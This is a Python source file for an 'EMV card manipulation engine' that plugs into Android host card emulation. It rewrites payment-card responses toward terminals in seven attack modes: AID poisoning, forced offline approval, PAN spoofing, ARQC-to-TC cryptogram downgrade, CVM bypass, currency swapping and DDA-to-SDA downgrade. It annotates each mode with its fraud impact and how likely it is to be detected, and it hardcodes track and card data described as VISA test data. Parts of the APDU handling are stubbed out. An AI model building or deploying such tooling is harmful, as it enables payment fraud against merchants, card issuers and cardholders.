#!/usr/bin/env python3
"""
EMV Card Manipulation Engine - Based on Real emv.html Test Data
Restructured attack system using actual VISA TEST MSD data
"""
import logging
from typing import Dict, List, Optional, Tuple

class EmvRealDataManipulator:
    """EMV manipulation engine based on real test card data from emv.html"""
    
    def __init__(self):
        # Real EMV data extracted from emv.html
        self.real_emv_data = {
            'ppse_response': '6f5b840e325041592e5359532e4444463031a549bf0c4661224f07a0000000031010870101500a564953412044454249545f55025553420341549061204f07a0000000980840870102500855532044454249545f5502555342034154909000',
            'visa_aid': 'A0000000031010',
            'debit_aid': 'A0000000980840', 
            'real_track2': '4154904674973556D29022010000820083001F',
            'real_cryptogram': 'D3967976E30EFAFC',
            'real_aip': '2000',  # DDA supported
            'real_pan': '4154904674973556',
            'real_expiry': '2902',
            'cardholder_name': '43415244484F4C4445522F56495341'  # CARDHOLDER/VISA
        }
        
        # Attack modes based on EMV specification vulnerabilities
        self.attack_modes = {
            0: {"name": "No Manipulation", "desc": "Standard EMV responses"},
            1: {"name": "PPSE AID Poisoning", "desc": "Change VISA AID to MasterCard in PPSE"},
            2: {"name": "AIP Force Offline", "desc": "Manipulate AIP to force offline approval"},
            3: {"name": "Track2 PAN Spoofing", "desc": "Replace PAN with different card number"},
            4: {"name": "Cryptogram Downgrade", "desc": "Change ARQC to TC for offline approval"}, 
            5: {"name": "CVM Bypass", "desc": "Remove cardholder verification requirements"},
            6: {"name": "Currency Manipulation", "desc": "Change currency code USD→EUR"},
            7: {"name": "Authentication Downgrade", "desc": "Force SDA instead of DDA"}
        }
        
        self.current_attack = 0
        
    def set_attack_mode(self, attack_id: int):
        """Set the current attack manipulation mode"""
        if attack_id in self.attack_modes:
            self.current_attack = attack_id
            logging.info(f"Attack mode set to {attack_id}: {self.attack_modes[attack_id]['name']}")
        else:
            logging.warning(f"Invalid attack mode: {attack_id}")
            
    def get_attack_info(self) -> Dict:
        """Get information about current attack mode"""
        return self.attack_modes.get(self.current_attack, self.attack_modes[0])
        
    def manipulate_ppse_response(self) -> str:
        """Manipulate PPSE response based on current attack mode"""
        original_response = self.real_emv_data['ppse_response']
        
        if self.current_attack == 1:  # PPSE AID Poisoning
            # Change VISA AID (A0000000031010) to MasterCard AID (A0000000041010)
            manipulated = original_response.replace('A0000000031010', 'A0000000041010')
            logging.info("ATTACK: PPSE AID poisoned VISA→MasterCard")
            return manipulated
            
        return original_response
        
    def manipulate_gpo_response(self, original_gpo: str) -> str:
        """Manipulate GPO response based on attack mode using real EMV structure"""
        
        if self.current_attack == 2:  # AIP Force Offline
            # Change AIP from 2000 (DDA) to 2008 (DDA + Force Offline)  
            manipulated = original_gpo.replace('82022000', '82022008')
            if manipulated != original_gpo:
                logging.info("ATTACK: AIP manipulated 2000→2008 (Force Offline)")
            return manipulated
            
        elif self.current_attack == 3:  # Track2 PAN Spoofing
            # Replace real PAN (4154904674973556) with test PAN (4000000000000002)
            original_pan = self.real_emv_data['real_pan']
            fake_pan = '4000000000000002'
            manipulated = original_gpo.replace(original_pan, fake_pan)
            if manipulated != original_gpo:
                logging.info(f"ATTACK: Track2 PAN spoofed {original_pan}→{fake_pan}")
            return manipulated
            
        elif self.current_attack == 4:  # Cryptogram Downgrade
            # Change cryptogram type from 80 (ARQC) to 40 (TC)
            manipulated = original_gpo.replace('9F270180', '9F270140')
            if manipulated != original_gpo:
                logging.info("ATTACK: Cryptogram downgraded ARQC→TC (Force Offline)")
            return manipulated
            
        elif self.current_attack == 5:  # CVM Bypass
            # Add "No CVM Required" policy to GPO response
            # Insert before status word (9000)
            no_cvm_policy = '8E0E000000000000001E030000000000000000'
            if '9000' in original_gpo and no_cvm_policy not in original_gpo:
                manipulated = original_gpo.replace('9000', f'{no_cvm_policy}9000')
                logging.info("ATTACK: CVM bypass - No verification required")
                return manipulated
            return original_gpo
            
        elif self.current_attack == 6:  # Currency Manipulation  
            # Change USD (0840) to EUR (0978)
            manipulated = original_gpo.replace('0840', '0978')
            if manipulated != original_gpo:
                logging.info("ATTACK: Currency manipulated USD(0840)→EUR(0978)")
            return manipulated
            
        elif self.current_attack == 7:  # Authentication Downgrade
            # Remove DDA capability from AIP (bit 5)
            # Change 2000 (DDA) to 0000 (Static only)
            manipulated = original_gpo.replace('82022000', '82020000')
            if manipulated != original_gpo:
                logging.info("ATTACK: Authentication downgraded DDA→SDA")
            return manipulated
            
        return original_gpo
        
    def manipulate_aid_response(self, aid: str, original_response: str) -> str:
        """Manipulate SELECT AID response based on attack mode"""
        
        if self.current_attack == 1 and aid.upper() == self.real_emv_data['visa_aid']:
            # Return MasterCard FCI when VISA AID is selected
            fake_mc_fci = '6F4F8407A0000000041010A544500D4D41535445524341524420544553545F2D02656E8701019F38189F66049F02069F03069F1A0295055F2A029A039C019F3704BF0C125F55024D439F5A05110840084042034154909000'
            logging.info("ATTACK: SELECT AID hijacked - VISA AID returns MasterCard FCI")
            return fake_mc_fci
            
        return original_response
        
    def get_manipulation_summary(self) -> Dict:
        """Get summary of current manipulation and expected impact"""
        attack_info = self.get_attack_info()
        
        summary = {
            'attack_id': self.current_attack,
            'attack_name': attack_info['name'],
            'description': attack_info['desc'],
            'target_commands': [],
            'expected_impact': '',
            'detection_risk': 'Low'  # Most attacks maintain valid EMV structure
        }
        
        if self.current_attack == 1:
            summary['target_commands'] = ['SELECT PPSE', 'SELECT AID']
            summary['expected_impact'] = 'Terminal processes VISA card as MasterCard - routing exploitation'
            
        elif self.current_attack == 2:
            summary['target_commands'] = ['GPO']
            summary['expected_impact'] = 'Transaction approved offline, bypassing online fraud checks'
            summary['detection_risk'] = 'Medium'
            
        elif self.current_attack == 3:
            summary['target_commands'] = ['GPO']
            summary['expected_impact'] = 'Different PAN processed - identity spoofing'
            summary['detection_risk'] = 'High'
            
        elif self.current_attack == 4:
            summary['target_commands'] = ['GPO']
            summary['expected_impact'] = 'Cryptogram bypass - offline approval without online auth'
            summary['detection_risk'] = 'High'
            
        elif self.current_attack == 5:
            summary['target_commands'] = ['GPO']
            summary['expected_impact'] = 'No PIN/signature required for high-value transactions'
            
        elif self.current_attack == 6:
            summary['target_commands'] = ['GPO']
            summary['expected_impact'] = 'Currency rate exploitation - $100 USD as €100 EUR'
            
        elif self.current_attack == 7:
            summary['target_commands'] = ['GPO']  
            summary['expected_impact'] = 'Weaker authentication - potential cloning vulnerability'
            
        return summary

# Integration class for Android HCE
class AndroidHceAttackIntegration:
    """Integration layer for Android HCE service attacks"""
    
    def __init__(self):
        self.manipulator = EmvRealDataManipulator()
        
    def set_manipulation_mode(self, attack_id: int):
        """Set attack mode for HCE service"""
        self.manipulator.set_attack_mode(attack_id)
        
    def process_apdu_with_attack(self, command_apdu: bytes) -> bytes:
        """Process APDU command with active attack manipulation"""
        command_hex = command_apdu.hex().upper()
        
        # Determine command type and apply appropriate manipulation
        if self.is_select_ppse(command_hex):
            response_hex = self.manipulator.manipulate_ppse_response()
            return bytes.fromhex(response_hex)
            
        elif self.is_select_aid(command_hex):
            aid = self.extract_aid_from_command(command_hex)
            # Would need original response from HCE service
            # This is integration point with existing HCE logic
            pass
            
        elif self.is_gpo_command(command_hex):
            # Would need original GPO response to manipulate
            # This is integration point with existing workflow manager
            pass
            
        # Return original processing if no manipulation
        return command_apdu
        
    def is_select_ppse(self, command_hex: str) -> bool:
        return '00A404000E325041592E5359532E4444463031' in command_hex.upper()
        
    def is_select_aid(self, command_hex: str) -> bool:
        return command_hex.startswith('00A40400')
        
    def is_gpo_command(self, command_hex: str) -> bool:
        return command_hex.startswith('80A8')
        
    def extract_aid_from_command(self, command_hex: str) -> str:
        # Extract AID from SELECT AID command
        if len(command_hex) >= 14:
            aid_length = int(command_hex[8:10], 16) * 2
            aid_start = 10
            aid_end = aid_start + aid_length
            return command_hex[aid_start:aid_end]
        return ""

if __name__ == "__main__":
    # Test the manipulation engine
    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
    
    manipulator = EmvRealDataManipulator()
    
    print("EMV Card Manipulation Engine - Real Data Based")
    print("=" * 60)
    
    for attack_id in range(8):
        manipulator.set_attack_mode(attack_id)
        summary = manipulator.get_manipulation_summary()
        print(f"{attack_id}: {summary['attack_name']}")
        print(f"   Impact: {summary['expected_impact']}")
        print(f"   Risk: {summary['detection_risk']}")
        print()